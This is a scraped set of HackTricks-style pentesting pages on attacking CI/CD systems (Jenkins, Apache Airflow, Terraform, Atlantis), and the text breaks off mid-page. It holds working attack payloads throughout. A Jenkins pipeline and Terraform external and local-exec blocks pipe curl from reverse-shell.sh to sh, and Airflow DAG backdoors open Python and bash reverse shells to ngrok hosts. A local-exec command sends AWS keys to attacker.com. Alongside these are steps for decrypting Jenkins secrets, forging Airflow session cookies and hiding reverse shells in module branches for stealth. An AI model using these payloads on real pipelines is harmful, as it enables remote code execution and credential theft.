config:\npipeline\n{\nagent\n{\nlabel\n'built-in'\n}\nComplete example\nPipeline in an specific agent, with a cron trigger, with pipeline and stage env variables, loading 2 variables in a step and sending a reverse shell:\npipeline\n{\nagent\n{\nlabel\n'built-in'\n}\ntriggers\n{\ncron\n(\n'H */4 * * 1-5'\n)\n}\nenvironment\n{\nGENERIC_ENV_VAR\n=\n\"Test pipeline ENV variables.\"\n}\n​\nstages\n{\nstage\n(\n\"Build\"\n)\n{\nenvironment\n{\nSTAGE_ENV_VAR\n=\n\"Test stage ENV variables.\"\n}\nsteps\n{\nwithCredentials\n([\nusernamePassword\n(\ncredentialsId:\n'amazon'\n, usernameVariable:\n'USERNAME'\n, passwordVariable:\n'PASSWORD'\n)\n,\nstring\n(\ncredentialsId:\n'slack-url'\n,variable:\n'SLACK_URL'\n)\n,\n])\n{\nsh\n''\n'\ncurl\nhttps://reverse-shell.sh/0.tcp.ngrok.io:16287\n|\nsh\nPASS\n''\n'\n}\n}\n}\n​\npost\n{\nalways\n{\ncleanWs\n()\n}\n}\n}\nPost Exploitation\nMetasploit\nmsf> post/multi/gather/jenkins_gather\nJenkins Secrets\nYou can list the secrets accessing\n/credentials/\nif you have enough permissions. Note that this will only list the secrets inside the\ncredentials.xml\nfile, but\nbuild configuration files\nmight also have\nmore credentials\n.\nIf you can\nsee the configuration of each project\n, you can also see in there the\nnames of the credentials (secrets)\nbeing use to access the repository and\nother credentials of the project\n.\nFrom Groovy\nJenkins Dumping Secrets from Groovy\nFrom disk\nThese files are needed to\ndecrypt Jenkins secrets\n:\nsecrets/master.key\nsecrets/hudson.util.Secret\nSuch\nsecrets can usually be found in\n:\ncredentials.xml\njobs/.../build.xml\njobs/.../config.xml\nHere's a regex to find them:\n# Find the secrets\ngrep\n-re\n\"^\\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<\"\n# Print only the filenames where the secrets are located\ngrep\n-lre\n\"^\\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<\"\n​\n# Secret example\ncredentials.xml:\n<\nsecret\n>\n{\nAQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw\n==\n}\n<\n/secret\n>\nDecrypt Jenkins secrets offline\nIf you have dumped the\nneeded passwords to decrypt the secrets\n, use\nthis script\nto decrypt those secrets\n.\npython3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml\n06165DF2-C047-4402-8CAB-1C8EC526C115\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT\nDecrypt Jenkins secrets from Groovy\nprintln\n(\nhudson.util.Secret.decrypt\n(\n\"{...}\"\n))\nCreate new admin user\n1.\nAccess the Jenkins config.xml file in\n/var/lib/jenkins/config.xml\nor\nC:\\Program Files (x86)\\Jenkis\\\n2.\nSearch for the word\n<useSecurity>true</useSecurity>\nand change the word **\ntrue\n** to\nfalse\n.\n1.\nsed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml\n3.\nRestart\nthe\nJenkins\nserver:\nservice jenkins restart\n4.\nNow go to the Jenkins portal again and\nJenkins will not ask any credentials\nthis time. You navigate to \"\nManage Jenkins\n\" to set the\nadministrator password again\n.\n5.\nEnable\nthe\nsecurity\nagain by changing settings to\n<useSecurity>true</useSecurity>\nand\nrestart the Jenkins again\n.\nReferences\n​\nhttps://github.com/gquere/pwn_jenkins\n​\n​\nhttps://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/\n​\n​\nhttps://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password\n​\n​\nhttps://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html\n​\n​\nhttps://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072\n​\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nPrevious\nBasic TravisCI Information\nNext\nBasic Jenkins Information\nLast modified\n1yr ago"
    },
    {
        "title": "Apache Airflow Security",
        "url": "https://cloud.hacktricks.xyz/pentesting-ci-cd/apache-airflow-security",
        "text": "Apache Airflow Security\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nBasic Information\n​\nApache Airflow\nis used for the\nscheduling and _orchestration of data pipelines or workflows\n. Orchestration of data pipelines refers to the sequencing, coordination, scheduling, and managing complex\ndata pipelines from diverse sources\n. These data pipelines deliver data sets that are ready for consumption either by business intelligence applications and data science, machine learning models that support big data applications.\nBasically, Apache Airflow will allow you to\nschedule de execution of code when something\n(event, cron)\nhappens\n.\nLocal Lab\nDocker-Compose\nYou can use the\ndocker-compose config file from\nhttps://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml\nto launch a complete apache airflow docker environment. (If you are in MacOS make sure to give at least 6GB of RAM to the docker VM).\nMinikube\nOne easy way to\nrun apache airflo\nw is to run it\nwith minikube\n:\nhelm repo\nadd\nairflow-stable https://airflow-helm.github.io/charts\nhelm repo update\nhelm\ninstall\nairflow-release airflow-stable/airflow\n# Some information about how to aceess the web console will appear after this command\n​\n# Use this command to delete it\nhelm delete airflow-release\nAirflow Configuration\nAirflow might store\nsensitive information\nin its configuration or you can find weak configurations in place:\nAirflow Configuration\nAirflow RBAC\nBefore start attacking Airflow you should understand\nhow permissions work\n:\nAirflow RBAC\nAttacks\nWeb Console Enumeration\nIf you have\naccess to the web console\nyou might be able to access some or all of the following information:\nVariables\n(Custom sensitive information might be stored here)\nConnections\n(Custom sensitive information might be stored here)\nAccess them in\nhttp://<airflow>/connection/list/\n​\nConfiguration\n(Sensitive information like the\nsecret_key\nand passwords might be stored here)\nList\nusers & roles\nCode of each DAG\n(which might contain interesting info)\nRetrieve Variables Values\nVariables can be stored in Airflow so the\nDAGs\ncan\naccess\ntheir values. It's similar to secrets of other platforms. If you have\nenough permissions\nyou can access them in the GUI in\nhttp://<airflow>/variable/list/\n.\nAirflow by default will show the value of the variable in the GUI, however, according to\nthis\nit's possible to set a\nlist of variables\nwhose\nvalue\nwill appear as\nasterisks\nin the\nGUI\n.\nHowever, these\nvalues\ncan still be\nretrieved\nvia\nCLI\n(you need to have DB access),\narbitrary DAG\nexecution,\nAPI\naccessing the variables endpoint (the API needs to be activated), and\neven the GUI itself!\n****To access those values from the GUI just\nselect the variables\nyou want to access and\nclick on Actions -> Export\n.\nAnother way is to perform a\nbruteforce\nto the\nhidden value\nusing the\nsearch filtering\nit until you get it:\nPrivilege Escalation\nIf the\nexpose_config\nconfiguration is set to\nTrue\n, from the\nrole User\nand\nupwards\ncan\nread\nthe\nconfig in the web\n. In this config, the\nsecret_key\nappears, which means any user with this valid they can\ncreate its own signed cookie to impersonate any other user account\n.\nflask-unsign\n--sign\n--secret\n'<secret_key>'\n--cookie\n\"{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}\"\nDAG Backdoor (RCE in Airflow worker)\nIf you have\nwrite access\nto the place where the\nDAGs are saved\n, you can just\ncreate one\nthat will send you a\nreverse shell.\nNote that this reverse shell is going to be executed inside an\nairflow worker container\n:\nimport\npendulum\nfrom\nairflow\nimport\nDAG\nfrom\nairflow\n.\noperators\n.\nbash\nimport\nBashOperator\n​\nwith\nDAG\n(\ndag_id\n=\n'rev_shell_bash'\n,\nschedule_interval\n=\n'0 0 * * *'\n,\nstart_date\n=\npendulum\n.\ndatetime\n(\n2021\n,\n1\n,\n1\n,\ntz\n=\n\"UTC\"\n),\n)\nas\ndag\n:\nrun\n=\nBashOperator\n(\ntask_id\n=\n'run'\n,\nbash_command\n=\n'bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1'\n,\n)\nimport\npendulum\n,\nsocket\n,\nos\n,\npty\nfrom\nairflow\nimport\nDAG\nfrom\nairflow\n.\noperators\n.\npython\nimport\nPythonOperator\n​\ndef\nrs\n(\nrhost\n,\nport\n):\ns\n=\nsocket\n.\nsocket\n()\ns\n.\nconnect\n((\nrhost\n,\nport\n))\n[\nos\n.\ndup2\n(\ns\n.\nfileno\n(),\nfd\n)\nfor\nfd\nin\n(\n0\n,\n1\n,\n2\n)]\npty\n.\nspawn\n(\n\"/bin/sh\"\n)\n​\nwith\nDAG\n(\ndag_id\n=\n'rev_shell_python'\n,\nschedule_interval\n=\n'0 0 * * *'\n,\nstart_date\n=\npendulum\n.\ndatetime\n(\n2021\n,\n1\n,\n1\n,\ntz\n=\n\"UTC\"\n),\n)\nas\ndag\n:\nrun\n=\nPythonOperator\n(\ntask_id\n=\n'rs_python'\n,\npython_callable\n=\nrs\n,\nop_kwargs\n=\n{\n\"rhost\"\n:\n\"8.tcp.ngrok.io\"\n,\n\"port\"\n:\n11433\n}\n)\nDAG Backdoor (RCE in Airflow scheduler)\nIf you set something to be\nexecuted in the root of the code\n, at the moment of this writing, it will be\nexecuted by the scheduler\nafter a couple of seconds after placing it inside the DAG's folder.\nimport\npendulum\n,\nsocket\n,\nos\n,\npty\nfrom\nairflow\nimport\nDAG\nfrom\nairflow\n.\noperators\n.\npython\nimport\nPythonOperator\n​\ndef\nrs\n(\nrhost\n,\nport\n):\ns\n=\nsocket\n.\nsocket\n()\ns\n.\nconnect\n((\nrhost\n,\nport\n))\n[\nos\n.\ndup2\n(\ns\n.\nfileno\n(),\nfd\n)\nfor\nfd\nin\n(\n0\n,\n1\n,\n2\n)]\npty\n.\nspawn\n(\n\"/bin/sh\"\n)\n​\nrs\n(\n\"2.tcp.ngrok.io\"\n,\n14403\n)\n​\nwith\nDAG\n(\ndag_id\n=\n'rev_shell_python2'\n,\nschedule_interval\n=\n'0 0 * * *'\n,\nstart_date\n=\npendulum\n.\ndatetime\n(\n2021\n,\n1\n,\n1\n,\ntz\n=\n\"UTC\"\n),\n)\nas\ndag\n:\nrun\n=\nPythonOperator\n(\ntask_id\n=\n'rs_python2'\n,\npython_callable\n=\nrs\n,\nop_kwargs\n=\n{\n\"rhost\"\n:\n\"2.tcp.ngrok.io\"\n,\n\"port\"\n:\n144\n}\nDAG Creation\nIf you manage to\ncompromise a machine inside the DAG cluster\n, you can create new\nDAGs scripts\nin the\ndags/\nfolder and they will be\nreplicated in the rest of the machines\ninside the DAG cluster.\nDAG Code Injection\nWhen you execute a DAG from the GUI you can\npass arguments\nto it.\nTherefore, if the DAG is not properly coded it could be\nvulnerable to Command Injection.\nThat is what happened in this CVE:\nhttps://www.exploit-db.com/exploits/49927\n​\nAll you need to know to\nstart looking for command injections in DAGs\nis that\nparameters\nare\naccessed\nwith the code\ndag_run.conf.get(\"param_name\")\n.\nMoreover, the same vulnerability might occur with\nvariables\n(note that with enough privileges you could\ncontrol the value of the variables\nin the GUI). Variables are\naccessed with\n:\nfrom\nairflow\n.\nmodels\nimport\nVariable\n[...]\nfoo\n=\nVariable\n.\nget\n(\n\"foo\"\n)\nIf they are used for example inside a a bash command, you could perform a command injection.\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nPrevious\nSCM IP Whitelisting Bypass\nNext\nAirflow Configuration\nLast modified\n1yr ago"
    },
    {
        "title": "Terraform Security",
        "url": "https://cloud.hacktricks.xyz/pentesting-ci-cd/terraform-security",
        "text": "Terraform Security\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nBasic Information\nHashiCorp Terraform is an\ninfrastructure as code tool\nthat lets you define both\ncloud and on-prem resources\nin human-readable configuration files that you can version, reuse, and share. You can then use a consistent workflow to provision and manage all of your infrastructure throughout its lifecycle. Terraform can manage low-level components like compute, storage, and networking resources, as well as high-level components like DNS entries and SaaS features.\nHow does Terraform work?\nTerraform creates and manages resources on cloud platforms and other services through their application programming interfaces (APIs). Providers enable Terraform to work with virtually any platform or service with an accessible API.\nHashiCorp and the Terraform community have already written\nmore than 1700 providers\nto manage thousands of different types of resources and services, and this number continues to grow. You can find all publicly available providers on the\nTerraform Registry\n, including Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog, and many more.\nThe core Terraform workflow consists of three stages:\nWrite:\nYou define resources, which may be across multiple cloud providers and services. For example, you might create a configuration to deploy an application on virtual machines in a Virtual Private Cloud (VPC) network with security groups and a load balancer.\nPlan:\nTerraform creates an execution plan describing the infrastructure it will create, update, or destroy based on the existing infrastructure and your configuration.\nApply:\nOn approval, Terraform performs the proposed operations in the correct order, respecting any resource dependencies. For example, if you update the properties of a VPC and change the number of virtual machines in that VPC, Terraform will recreate the VPC before scaling the virtual machines.\nTerraform Enterprise\nTerraform Enterprise allows you to\nrun commands\nsuch as\nterraform plan\nor\nterraform apply\nremotely in a\nself-hosted version of Terraform Cloud\n. Therefore, if you find the\nAPI key\nto access that Terraform server, you can\ncompromise it\n.\nFor more info check:\nTerraform Enterprise Security\nTerraform Lab\nJust install terraform in your computer.\nHere you have a\nguide\nand here you have the\nbest way to download terraform\n.\nRCE in Terraform\nTerraform\ndoesn't have a platform exposing a web page or a network service\nwe can enumerate, therefore, the only way to compromise terraform is to\nbe able to add/modify terraform configuration files\n.\nHowever, terraform is a\nvery sensitive component\nto compromise because it will have\nprivileged access\nto different locations so it can work properly.\nThe main way for an attacker to be able to compromise the system where terraform is running is to\ncompromise the repository that stores terraform configurations\n, because at some point they are going to be\ninterpreted\n.\nActually, there are solutions out there that\nexecute terraform plan/apply automatically after a PR\nis created, such as\nAtlantis\n:\nAtlantis Security\nIf you are able to compromise a terraform file there are different ways you can perform RCE when someone executed\nterraform plan\nor\nterraform apply\n.\nTerraform plan\nTerraform plan is the\nmost used command\nin terraform and developers/solutions using terraform call it all the time, so the\neasiest way to get RCE\nis to make sure you poison a terraform config file that will execute arbitrary commands in a\nterraform plan\n.\nUsing an external provider\nTerraform offers the\nexternal\nprovider\nwhich provides a way to interface between Terraform and external programs. You can use the\nexternal\ndata source to run arbitrary code during a\nplan\n.\nInjecting in a terraform config file something like the following will execute a rev shell when executing\nterraform plan\n:\ndata\n\"external\"\n\"example\"\n{\nprogram\n=\n[\n\"sh\"\n,\n\"-c\"\n,\n\"curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh\"\n]\n}\nUsing a custom provider\nAnyone can write a\ncustom provider\nand publish it to the\nTerraform Registry\n. You could also try to pull a custom provider from a private registry.\nThat’s it:\nwrite a custom provider than runs some malicious code (like exfiltrating credentials or customer data)\npublish it to the Terraform Registry\nadd the provider to the Terraform code in a feature branch\nopen a PR for the feature branch\nterraform\n{\nrequired_providers\n{\nevil\n=\n{\nsource\n=\n\"evil/evil\"\nversion\n=\n\"1.0\"\n}\n}\n}\n​\nprovider\n\"evil\"\n{}\nSince the provider will be pulled in during the\ninit\nand run some code during the\nplan\n, you have arbitrary code execution.\nYou can find an example in\nhttps://github.com/rung/terraform-provider-cmdexec\n​\nUsing an external reference\nBoth mentioned options are useful but not very stealthy (the second is more stealthy but more complex than the first one). You can perform this attack even in a\nstealthier way\n, by following this suggestions:\nInstead of adding the rev shell directly into the terraform file, you can\nload an external resource\nthat contains the rev shell:\nmodule\n\"not_rev_shell\"\n{\nsource\n=\n\"\n[email protected]\n:carlospolop/terraform_external_module_rev_shell//modules\"\n}\nYou can find the rev shell code in\nhttps://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules\n​\nIn the external resource, use the\nref\nfeature to hide the\nterraform rev shell code in a branch\ninside of the repo, something like:\n[email protected]\n:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b\nTerraform Apply\nTerraform apply will be executed to apply all the changes, you can also abuse it to obtain RCE injecting\na malicious Terraform file with\nlocal-exec\n.\n****You just need to make sure some payload like the following ones ends in the\nmain.tf\nfile:\n// Payload 1 to just steal a secret\nresource\n\"null_resource\"\n\"secret_stealer\"\n{\nprovisioner\n\"local-exec\"\n{\ncommand =\n\"curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY\"\n}\n}\n​\n// Payload 2 to get a rev shell\nresource\n\"null_resource\"\n\"rev_shell\"\n{\nprovisioner\n\"local-exec\"\n{\ncommand =\n\"sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'\"\n}\n}\nFollow the\nsuggestions from the previous technique\nthe perform this attack in a\nstealthier way using external references\n.\nSecrets Dumps\nYou can have\nsecret values used by terraform dumped\nrunning\nterraform apply\nby adding to the terraform file something like:\noutput\n\"dotoken\"\n{\nvalue = nonsensitive(var.do_token)\n}\nAudit Tools\n​\ntfsec\n: tfsec uses static analysis of your terraform code to spot potential misconfigurations.\n​\nterascan\n: Terrascan is a static code analyzer for Infrastructure as Code.\nReferences\n​\nAtlantis Security\n​\n​\nhttps://alex.kaskaso.li/post/terraform-plan-rce\n​\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nPrevious\nAirflow RBAC\nNext\nTerraform Enterprise Security\nLast modified\n1yr ago"
    },
    {
        "title": "Atlantis Security",
        "url": "https://cloud.hacktricks.xyz/pentesting-ci-cd/atlantis-security",
        "text": "Atlantis Security\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nBasic Information\nAtlantis basically helps you to to run terraform from Pull Requests from your git server.\nLocal Lab\n1.\nGo to the\natlantis releases page\nin\nhttps://github.com/runatlantis/atlantis/releases\nand\ndownload\nthe one that suits you.\n2.\nCreate a\npersonal token\n(with repo access) of your\ngithub\nuser\n3.\nExecute\n./atlantis testdrive\nand it will create a\ndemo repo\nyou can use to\ntalk to atlantis\n1.\nYou can access the web page in 127.0.0.1:4141\nAtlantis Access\nGit Server Credentials\nAtlantis\nsupport several git hosts such as\nGithub\n,\nGitlab\n,\nBitbucket\nand\nAzure DevOps\n.\nHowever, in order to access the repos in those platforms and perform actions, it needs to have some\nprivileged access granted to them\n(at least write permissions).\nThe docs\nencourage to create a user in these platform specifically for Atlantis, but some people might use personal accounts.\nIn any case, from an attackers perspective, the\nAtlantis account\nis going to be one very\ninteresting\nto compromise\n.\nWebhooks\nAtlantis uses optionally\nWebhook secrets\nto validate that the\nwebhooks\nit receives from your Git host are\nlegitimate\n.\nOne way to confirm this would be to\nallowlist requests to only come from the IPs\nof your Git host but an easier way is to use a Webhook Secret.\nNote that unless you use a private github or bitbucket server, you will need to expose webhook endpoints to the Internet.\nAtlantis is going to be\nexposing webhooks\nso the git server can send it information. From an attackers perspective it would be interesting to know\nif you can send it messages\n.\nProvider Credentials\nAtlantis runs Terraform by simply\nexecuting\nterraform plan\nand\napply\ncommands on the server\nAtlantis is hosted on\n. Just like when you run Terraform locally, Atlantis needs credentials for your specific provider.\nIt's up to you how you\nprovide credentials\nfor your specific provider to Atlantis:\nThe Atlantis\nHelm Chart\nand\nAWS Fargate Module\nhave their own mechanisms for provider credentials. Read their docs.\nIf you're running Atlantis in a cloud then many clouds have ways to give cloud API access to applications running on them, ex:\n​\nAWS EC2 Roles\n(Search for \"EC2 Role\")\n​\nGCE Instance Service Accounts\n​\nMany users set environment variables, ex.\nAWS_ACCESS_KEY\n, where Atlantis is running.\nOthers create the necessary config files, ex.\n~/.aws/credentials\n, where Atlantis is running.\nUse the\nHashiCorp Vault Provider\nto obtain provider credentials.\nThe\ncontainer\nwhere\nAtlantis\nis\nrunning\nwill highly probably\ncontain privileged credentials\nto the providers (AWS, GCP, Github...) that Atlantis is managing via Terraform.\nWeb Page\nBy default Atlantis will run a\nweb page in the port 4141 in localhost\n. This page just allows you to enable/disable atlantis apply and check the plan status of the repos and unlock them (it doesn't allow to modify things, so it isn't that useful).\nYou probably won't find it exposed to the internet, but it looks like by default\nno credentials are needed\nto access it (and if they are\natlantis\n:\natlantis\nare the\ndefault\nones).\nServer Configuration\nConfiguration to\natlantis server\ncan be specified via command line flags, environment variables, a config file or a mix of the three.\nYou can find\nhere the list of flags\nsupported by Atlantis server\nYou can find\nhere how to transform a config option into an env var\n​\nValues are\nchosen in this order\n:\n1.\nFlags\n2.\nEnvironment Variables\n3.\nConfig File\nNote that in the configuration you might find interesting values such as\ntokens and passwords\n.\nRepos Configuration\nSome configurations affects\nhow the repos are managed\n. However, it's possible that\neach repo require different settings\n, so there are ways to specify each repo. This is the priority order:\n1.\nRepo\n/atlantis.yml\nfile. This file can be used to specify how atlantis should treat the repo. However, by default some keys cannot be specified here without some flags allowing it.\n1.\nProbably required to be allowed by flags like\nallowed_overrides\nor\nallow_custom_workflows\n2.\n​\nServer Side Config\n: You can pass it with the flag\n--repo-config\nand it's a yaml configuring new settings for each repo (regexes supported)\n3.\nDefault\nvalues\nPR Protections\nAtlantis allows to indicate if you want the\nPR\nto be\napproved\nby somebody else (even if that isn't set in the branch protection) and/or be\nmergeable\n(branch protections passed)\nbefore running apply\n. From a security point of view, to set both options a recommended.\nIn case\nallowed_overrides\nis True, these setting can be\noverwritten on each project by the\n/atlantis.yml\nfile\n.\nScripts\nThe repo config can\nspecify scripts\nto run\nbefore\n(\npre workflow hooks\n) and\nafter\n(\npost workflow hooks\n) a\nworkflow is executed.\nThere isn't any option to allow\nspecifying\nthese scripts in the\nrepo\n/atlantis.yml\nfile.\nWorkflow\nIn the repo config (server side config) you can\nspecify a new default workflow\n, or\ncreate new custom workflows\n.\nYou can also\nspecify\nwhich\nrepos\ncan\naccess\nthe\nnew\nones generated.\nThen, you can allow the\natlantis.yaml\nfile of each repo to\nspecify the workflow to use.\nIf the\nserver side config\nflag\nallow_custom_workflows\nis set to\nTrue\n, workflows can be\nspecified\nin the\natlantis.yaml\nfile of each repo. It's also potentially needed that\nallowed_overrides\nspecifies also\nworkflow\nto\noverride the workflow\nthat is going to be used.\nThis will basically give\nRCE in the Atlantis server to any user that can access that repo\n.\n# atlantis.yaml\nversion\n:\n3\nprojects\n:\n-\ndir\n:\n.\nworkflow\n:\ncustom1\nworkflows\n:\ncustom1\n:\nplan\n:\nsteps\n:\n-\ninit\n-\nrun\n:\nmy custom plan command\napply\n:\nsteps\n:\n-\nrun\n:\nmy custom apply command\nConftest Policy Checking\nAtlantis supports running\nserver-side\nconftest\npolicies\nagainst the plan output. Common usecases for using this step include:\nDenying usage of a list of modules\nAsserting attributes of a resource at creation time\nCatching unintentional resource deletions\nPreventing security risks (ie. exposing secure ports to the public)\nYou can check how to configure it in\nthe docs\n.\nAtlantis Commands\n​\nIn the docs\nyou can find the options you can use to run Atlantis:\n# Get help\natlantis\nhelp\n​\n# Run terraform plan\natlantis plan\n[\noptions\n]\n--\n[\nterraform plan flags\n]\n##Options:\n## -d directory\n## -p project\n## --verbose\n## You can also add extra terraform options\n​\n# Run terraform apply\natlantis apply\n[\noptions\n]\n--\n[\nterraform apply flags\n]\n##Options:\n## -d directory\n## -p project\n## -w workspace\n## --auto-merge-disabled\n## --verbose\n## You can also add extra terraform options\nAttacks\nIf during the exploitation you find this\nerror\n:\nError: Error acquiring the state lock\nYou can fix it by running:\natlantis unlock #You might need to run this in a different PR\natlantis plan -- -lock=false\nAtlantis plan RCE - Config modification in new PR\nIf you have write access over a repository you will be able to create a new branch on it and generate a PR. If you can\nexecute\natlantis plan\n(or maybe it's automatically executed)\nyou will be able to RCE inside the Atlantis server\n.\nYou can do this by making\nAtlantis load an external data source\n. Just put a payload like the following in the\nmain.tf\nfile:\ndata\n\"external\"\n\"example\"\n{\nprogram =\n[\n\"sh\"\n,\n\"-c\"\n,\n\"curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh\"\n]\n}\nStealthier Attack\nYou can perform this attack even in a\nstealthier way\n, by following this suggestions:\nInstead of adding the rev shell directly into the terraform file, you can\nload an external resource\nthat contains the rev shell:\nmodule\n\"not_rev_shell\"\n{\nsource\n=\n\"\n[email protected]\n:carlospolop/terraform_external_module_rev_shell//modules\"\n}\nYou can find the rev shell code in\nhttps://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules\n​\nIn the external resource, use the\nref\nfeature to hide the\nterraform rev shell code in a branch\ninside of the repo, something like:\n[email protected]\n:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b\nInstead\nof creating a\nPR to master\nto trigger Atlantis,\ncreate 2 branches\n(test1 and test2) and create a\nPR from one to the other\n. When you have completed the attack, just\nremove the PR and the branches\n.\nAtlantis plan Secrets Dump\nYou can\ndump secrets used by terraform\nrunning\natlantis plan\n(\nterraform plan\n) by putting something like this in the terraform file:\noutput\n\"dotoken\"\n{\nvalue = nonsensitive(var.do_token)\n}\nAtlantis apply RCE - Config modification in new PR\nIf you have write access over a repository you will be able to create a new branch on it and generate a PR. If you can\nexecute\natlantis apply\nyou will be able to RCE inside the Atlantis server\n.\nHowever, you will usually need to bypass some protections:\nMergeable\n: If this protection is set in Atlantis, you can only run\natlantis apply\nif the PR is mergeable\n(which means that the branch protection need to be bypassed).\nCheck potential\nbranch protections bypasses\n​\nApproved\n: If this protection is set in Atlantis, some\nother user must approve the PR\nbefore you can run\natlantis apply\nBy default you can abuse the\nGitbot token to bypass this protection\n​\nRunning\nterraform apply\non a malicious Terraform file with\nlocal-exec\n.\nYou just need to make sure some payload like the following ones ends in the\nmain.tf\nfile:\n// Payload 1 to just steal a secret\nresource\n\"null_resource\"\n\"secret_stealer\"\n{\nprovisioner\n\"local-exec\"\n{\ncommand =\n\"curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY\"\n}\n}\n​\n// Payload 2 to get a rev shell\nresource\n\"null_resource\"\n\"rev_shell\"\n{\nprovisioner\n\"local-exec\"\n{\ncommand =\n\"sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'\"\n}\n}\nFollow the\nsuggestions from the previous technique\nthe perform this attack in a\nstealthier way\n.\nTerraform Param Injection\nWhen running\natlantis plan\nor\natlantis apply\nterraform is being run under-needs, you can pass commands to terraform from atlantis commenting something like:\natlantis plan --\n<\nterraform commands\n>\natlantis plan --\n-h\n#Get terraform plan help\n​\natlantis apply --\n<\nterraform commands\n>\natlantis apply --\n-h\n#Get terraform apply help\nSomething you can pass are env variables which might be helpful to bypass some protections. Check terraform env vars in\nhttps://www.terraform.io/cli/config/environment-variables\n​\nCustom Workflow\nRunning\nmalicious custom build commands\nspecified in an\natlantis.yaml\nfile. Atlantis uses the\natlantis.yaml\nfile from the pull request branch,\nnot\nof\nmaster\n.\nThis possibility was mentioned in a previous section:\nIf the\nserver side config\nflag\nallow_custom_workflows\nis set to\nTrue\n, workflows can be\nspecified\nin the\natlantis.yaml\nfile of each repo. It's also potentially needed 